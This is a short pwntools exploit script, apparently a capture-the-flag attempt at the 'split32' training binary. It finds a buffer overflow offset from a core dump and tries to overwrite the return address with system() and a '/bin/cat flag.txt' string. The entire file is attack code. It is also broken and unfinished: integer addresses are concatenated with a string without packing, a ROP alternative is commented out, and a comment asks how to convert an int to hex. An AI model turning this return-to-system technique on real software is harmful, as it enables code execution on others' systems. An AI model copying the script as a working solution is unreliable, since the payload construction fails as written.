
from pwn import *
e = ELF('split32')
elf = context.binary=ELF('split32')
context.log_level='DEBUG'
io = process(elf.path)
io.sendline(cyclic(512))
io.wait()
core = io.corefile
stack = core.esp
pattern = core.read(stack,4)
size = cyclic_find(pattern)
junk = size - 4  
offset = junk * 'A'
sysplt = e.symbols['system']
cat = e.search('/bin/cat flag.txt').next()
info('call system addr: 0x{sa:08X}'.format(sa=sysplt))
info('call cat addr: 0x{cf:08X}'.format(cf=cat))
p = process(e.path)
p.recvuntil('> ')
shit = offset+sysplt+cat
p.sendline(shit)
#rop = ROP(e)
#rop.system(cat)
#info(rop.dump())
#buf = cyclic(50)
#p = process(e.path)
#HOW TO CONVERT INT TO HEX?!
